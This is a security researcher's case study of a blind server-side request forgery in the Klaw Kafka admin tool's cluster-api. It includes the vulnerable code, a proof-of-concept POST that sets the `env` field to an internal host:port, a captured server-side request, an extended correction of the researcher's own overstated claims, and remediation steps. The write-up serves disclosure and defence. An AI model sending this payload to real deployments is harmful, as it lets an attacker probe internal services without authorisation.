# Case Study 11 — Blind SSRF via the Kafka Connect `env` Parameter

| Field | Value |
|-------|-------|
| **Severity** | P3 (as triaged) — and **overstated by me**, corrected on the record |
| **CWE** | CWE-918 (Server-Side Request Forgery) / CWE-20 (Improper Input Validation) |
| **OWASP** | A10:2021 — Server-Side Request Forgery |
| **VRT** | Broken Access Control → Privilege Escalation (as triage-set) |
| **Surface** | Open-source Kafka/cluster admin UI (Aiven-Open/klaw) — `cluster-api` module |
| **Status** | Submitted 2026-09-29 — **Duplicate**, P3, Unresolved · triaged as a valid issue (duplicate of an earlier same-endpoint-class report) · self-correction issued in this write-up |

---

## Problem

The `cluster-api` module exposes Kafka Connect management endpoints that take a JSON body
containing an `env` field — a host:port string. That value is split, concatenated into a URL,
and handed to a `RestTemplate` outbound call with no host allowlist and no validation.

Three lines carry it:

```java
// KafkaConnectService.java:384-386
public String[] getEnvironment(String environments) {
  return environments.split(",");
}

// ClusterApiUtils.java:528-533
public Pair<String, RestTemplate> getRequestDetails(String suffixUrl, KafkaSupportedProtocol protocol) {
  if (PLAINTEXT == protocol) {
    connectorsUrl = HTTP_PREFIX + suffixUrl;   // "http://" + attacker value
```

`POST /topics/postConnector` builds `env + "/connectors/" + connectorName` and posts to it.
Setting `env` to `127.0.0.1:9998` makes **cluster-api** send `POST /connectors` to whatever is
listening there.

**Impact, stated precisely: blind SSRF.** The outbound request reaches an attacker-chosen
`host:port` — and that is all. The response body never returns to the caller (see below).

## Attack Chain

```
┌──────────────────────────┐     ┌──────────────────────────────────┐
│ Valid cluster-api JWT    │────▶│ POST /topics/postConnector       │
│ (obtained once, then     │     │ { "env": "127.0.0.1:9998", ... } │
│  reusable within TTL)    │     └────────────────┬─────────────────┘
└──────────────────────────┘                      │
                                                  ▼
                                   ┌──────────────────────────────┐
                                   │ getEnvironment(): split(",") │
                                   │ getRequestDetails():         │
                                   │   "http://" + env            │
                                   └──────────────┬───────────────┘
                                                  ▼
                                   ┌──────────────────────────────┐
                                   │ RestTemplate.postForEntity   │
                                   │ cluster-api → :9998          │
                                   │ POST /connectors  Host: …    │
                                   └──────────────┬───────────────┘
                                                  ▼
                                   ┌──────────────────────────────┐
                                   │ processResponseBody():       │
                                   │ returns SUCCESS / notOk only │
                                   │ ⇒ response body DISCARDED    │
                                   │ ⇒ blind, not reflected       │
                                   └──────────────────────────────┘
```

## Approach

### Step 1 — Obtain a cluster-api token
Log in to core, then fire the connectivity test with a listener URL to capture the outbound
bearer JWT. (This step is *token acquisition* — convenient, not the vulnerability. The sink
below is reached by any valid token.)

### Step 2 — Point `env` at a listener
```bash
POST /topics/postConnector
Authorization: Bearer <JWT>
{"env":"127.0.0.1:9998","protocol":"PLAINTEXT","connectorConfig":"{}",
 "connectorName":"test","clusterIdentification":"test"}
```

### Step 3 — Confirm the outbound request
Listener on `:9998` received:

```
POST /connectors
User-Agent: Java/21.0.12
Host: 127.0.0.1:9998
Content-Length: 2
```

`User-Agent: Java/…` is the signature — this came from the JVM, not from my shell. The server
made the request.

### Step 4 — Establish that it is *blind*
`postForEntity` captures the response, but `processResponseBody` (`KafkaConnectService:369`)
only inspects the status code and returns `ApiResponse.SUCCESS` or `notOk`. The upstream body
is never written into the return value. So: request confirmed out, **no content back**.

---

## What I Got Wrong — and Corrected Before Being Asked

I filed this with six affected endpoints, an exfiltration claim, and `AV:N`. On re-verification
all three were wrong. I published the correction in this write-up rather than leave a claim
standing that my own evidence did not support.

**1. Five of six endpoints were never tested.**
My own enumeration notes recorded `updateConnector`, `deleteConnector`, `connector/restart`,
`pause` and `resume` as **"Not tested"**. Listing untested routes as affected is not evidence —
"probably the same way" is a hypothesis, not a result. **Proven endpoints: one.**

*I stopped there deliberately, and it was a triage judgement, not a testing one.* The submission
had already been triaged as a valid issue and closed as a duplicate of an earlier report on the
same endpoint class, so further endpoint enumeration could not change the outcome — a private
engagement would have had a different incentive structure and I would have worked each route
to a proof. **The standard I hold is the engagement, not the bounty.** What I owe a customer is
a proven chain, and the honest thing in a bounty context is to say which endpoints I proved
rather than pad the list with untested ones.

**2. The exfiltration claim was false.** I read `if (is2xxSuccessful()) return ApiResponse.SUCCESS`
and stopped — I did not follow the fall-through to `processResponseBody`, which is status-only.
Because the body is discarded, the demonstrated behaviour is blind SSRF. The one endpoint that
*would* return a typed body is `getAllConnectors`, which is one I failed to test.

**3. I misdiagnosed my own 400.** `GET /topics/getAllConnectors/…` returned 400 and I recorded
it as a path-format problem — a property of the endpoint. It was a missing required parameter:
`KafkaConnectController:38` declares `@RequestParam("connectorStatus") boolean connectorStatus`.
I never sent it. That is my error in reading a response, not a finding about the route — and
it means the one endpoint likely to return a typed body went untested while I claimed
exfiltration.

**4. Actor model was wrong.** The precondition is a token plus control of the request body —
not an unauthenticated network attacker. `AV:N` was not defensible.

**What survived all of it:** an authenticated holder of a valid cluster-api token can make
cluster-api issue outbound HTTP to an arbitrary `host:port` through an unvalidated `env`
parameter with no host allowlist. That is a real SSRF primitive, and it is what I now claim.

---

## Results

- **Blind SSRF confirmed** — outbound request observed at an attacker-chosen `host:port`,
  `User-Agent: Java/21.0.12` proving server-side origin
- **One** endpoint proven, not six
- **No** response reflection — `processResponseBody` discards the body
- Scheme constrained to `http://` by the fixed prefix prepend
- Preconditions: valid cluster-api token; PoC against locally-launched `2.10.6` jars
- **Triage:** **Duplicate**, P3, Unresolved — master filed 2024 against a *different target*
  (`klaw-core`'s `testClusterApiConnection`, a different module and parameter). The
  endpoint-overlap argument was available; I chose not to spend a slot contesting it, and put
  the corrections on the record instead.

## Triage Response & Recommendation

**Outcome:** duplicate. I did not contest it. My own report was overstated in three material
ways at the time of verdict, and correcting that mattered more than arguing priority.

**Reporter takeaway:** the endpoint-list inflation was the serious error, not the severity
disagreement. Claiming six affected routes when five are untested is the kind of thing that
costs credibility even where the core bug is real — and it is trivially avoidable: keep an
enumeration note with a *Tested / Not tested* column, and never let an untested route into an
"Affected Endpoints" heading. Second: read your own error responses properly. My 400 was a
missing required parameter; I called it a path problem and let the one route that might have
substantiated my impact claim sit untested while I asserted it anyway.

---

## Remediation Delivered

- Validate `env` against an allowlist of known Kafka Connect hosts before use
- Reject values containing scheme, path, or anything outside `host:port` shape
- Do not derive a request URL by string concatenation of caller input — resolve against a
  configured base and reject if the result escapes it
- Restrict egress from cluster-api to the Kafka Connect estate at the network layer
- Return a clean rejection for malformed `env` rather than an opaque upstream failure

## Tooling

Source review (`KafkaConnectService`, `ClusterApiUtils`, `KafkaConnectController`), local
`klaw-2.10.6.jar` + `cluster-api-2.10.6.jar` lab, a listener to capture the server-side
request, enumeration notes tracking per-endpoint test status — AI-assisted generation; I drove
the chain, and the corrections came from re-running my own claims rather than defending them.

---

*Sanitized: rig passwords, account handles, and captured tokens redacted. Full report and
evidence package on request under program terms.*
